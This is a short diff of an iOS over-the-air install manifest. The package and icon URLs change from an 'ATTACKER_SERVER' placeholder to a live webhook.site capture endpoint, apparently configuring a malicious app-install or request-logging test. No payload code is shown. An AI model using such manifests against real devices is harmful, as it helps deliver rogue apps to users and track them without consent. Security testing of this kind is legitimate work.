@@ -11,19 +11,19 @@
 					<key>kind</key>
 					<string>software-package</string>
 					<key>url</key>
-					<string>https://ATTACKER_SERVER/app.ipa</string>
+					<string>https://webhook.site/9832cd01-97ff-4525-ad55-9f07a9661384/app.ipa</string>
 				</dict>
 				<dict>
 					<key>kind</key>
 					<string>display-image</string>
 					<key>url</key>
-					<string>https://ATTACKER_SERVER/icon.png</string>
+					<string>https://webhook.site/9832cd01-97ff-4525-ad55-9f07a9661384/icon.png</string>
 				</dict>
 				<dict>
 					<key>kind</key>
 					<string>full-size-image</string>
 					<key>url</key>
-					<string>https://ATTACKER_SERVER/icon_large.png</string>
+					<string>https://webhook.site/9832cd01-97ff-4525-ad55-9f07a9661384/icon_large.png</string>
 				</dict>
 			</array>
 			<key>metadata</key>
